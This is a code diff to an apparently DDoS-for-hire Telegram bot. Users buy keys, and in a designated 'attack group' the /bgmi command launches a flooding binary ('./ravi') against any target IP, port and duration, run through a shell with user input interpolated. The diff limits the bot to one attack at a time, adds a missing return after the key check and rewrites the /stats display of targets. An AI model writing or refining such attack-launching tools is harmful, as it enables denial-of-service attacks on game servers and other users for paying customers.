@@ -22,7 +22,10 @@ ADMIN_IDS = [7129010361]
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 
 # Default max duration (in seconds)
+global active_attack
+active_attack = None
 MAX_DURATION = 300
+active_attacks = {}
 
 # ✅ FILE PATHS
 USER_FILE = "users.txt"
@@ -399,11 +402,13 @@ def redeem_key(message):
 ## ✅ /RS Attack Command (Auto-Remove from /stats)
 @bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
+    global active_attack  # for global access
     user_id = str(message.from_user.id)
     chat_id = str(message.chat.id)
 
     if not is_user_allowed(user_id):  # ✅ Expired Key Check
-        bot.reply_to(message, "⏳ **PEHLW KEY BUY KRO**")
+        bot.reply_to(message, "⏳ **PEHLE KEY BUY KRO**")
+        return
 
     if chat_id != GROUP_ID:
         bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
@@ -427,34 +432,31 @@ def handle_attack(message):
         bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
         return
 
-    if time_duration > MAX_DURATION:  # Use admin-set MAX_DURATION
-            bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
-            return
+    if time_duration > MAX_DURATION:
+        bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
+        return
 
-    if user_id not in active_attacks:
-        active_attacks[user_id] = []
-
-    if len(active_attacks[user_id]) >= 2:
-        bot.reply_to(message, "❌ MAXIMUM 2 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
+    # ✅ Check if any global attack is already active
+    if active_attack is not None:
+        bot.reply_to(message, "⚠ BOT PAR EK ATTACK PEHLE SE CHAL RAHA HAI! WAIT KARO.")
         return
 
     end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
-    active_attacks[user_id].append((target, port, end_time))
+    active_attack = (user_id, target, port, end_time)
 
     bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")
 
     def attack_execution():
         try:
-            subprocess.run(f"./ravi {target} {port} {time_duration} 2000", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./ravi {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
         except subprocess.TimeoutExpired:
             bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ ATTACK FAILED!")
 
-        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
-        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[0] != target]
-        if not active_attacks[user_id]:  # अगर कोई अटैक बचा नहीं, तो एंट्री ही हटा दो
-            del active_attacks[user_id]
+        # ✅ Clear active attack after finish
+        global active_attack
+        active_attack = None
 
     threading.Thread(target=attack_execution).start()
 
@@ -462,26 +464,32 @@ def handle_attack(message):
 # ✅ /STATS Command - Shows Only Active Attacks
 @bot.message_handler(commands=['stats'])
 def attack_stats(message):
-    if not active_attacks:  # ✅ INDENTATION FIXED
-        bot.reply_to(message, "📊 No Active Attacks Right Now!")
-        return  # ✅ यह लाइन सही से इंडेंट होनी चाहिए
+    global active_attack, last_active_attack
 
     now = datetime.datetime.now(IST)
 
-    # ✅ खत्म हुए अटैक हटाओ
-    for user_id in list(active_attacks.keys()):
-        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
-        if not active_attacks[user_id]:  
-            del active_attacks[user_id]
+    display_attack = active_attack or last_active_attack
 
-    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
+    if not display_attack:
+        bot.reply_to(message, "📊 No Active or Previous Attack!")
+        return
 
-    for user_id, attacks in active_attacks.items():
-        stats_message += f"👤 **User ID:** `{user_id}`\n"
-        for target, port, end_time in attacks:
-            remaining_time = (end_time - now).total_seconds()
-            stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"
+    user_id, target, port, end_time = display_attack
+    remaining = int((end_time - now).total_seconds())
 
+    if remaining > 0:
+        status_line = f"⏳ **Ends In:** `{remaining}s`"
+    else:
+        status_line = f"✅ **Status:** `Finished`"
+
+    stats_message = f"""
+📊 **ATTACK STATUS:**
+
+👤 **User ID:** `{user_id}`
+🚀 **Target:** `{target}`
+🎯 **Port:** `{port}`
+{status_line}
+"""
     bot.reply_to(message, stats_message, parse_mode="Markdown")
 
 # ✅ /MYINFO Command (Shows User Details + Key Expiry)
